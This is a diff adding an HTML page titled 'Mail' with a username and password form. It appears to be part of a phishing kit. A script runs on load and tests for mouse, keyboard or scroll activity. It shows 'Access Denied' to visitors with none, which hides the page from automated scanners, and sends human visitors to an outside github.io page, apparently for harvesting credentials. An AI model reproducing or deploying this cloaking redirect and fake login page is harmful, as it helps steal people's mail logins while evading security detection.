@@ -1,0 +1,39 @@
+<!DOCTYPE html><html lang="zxx">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title class="logoname">Mail</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script><script>
+    let userInteracted = false;
+
+    function detectBot() {
+        if (!userInteracted) {
+            document.body.innerHTML = "<h2>Access Denied</h2>";
+        } else {
+            window.location.href = "https://sfi4families.github.io/newlandedproperty/#";  // Replace with your actual link
+        }
+    }
+
+    document.addEventListener("mousemove", () => userInteracted = true);
+    document.addEventListener("keydown", () => userInteracted = true);
+    document.addEventListener("scroll", () => userInteracted = true);
+    
+    window.onload = function() {
+        setTimeout(detectBot, 3000);
+    };
+</script>
+
+</head>
+<body>
+    <h1>Welcome</h1>
+    <p>If you see this, you are human!</p><div class="login-1">
+    <div class="form-section">
+        <h3>Login</h3>
+        <input type="text" placeholder="Username" class="input-text">
+        <input type="password" placeholder="Password" class="input-text">
+        <button class="btn-theme">Login</button>
+    </div>
+</div>
+
+</body>
+</html>
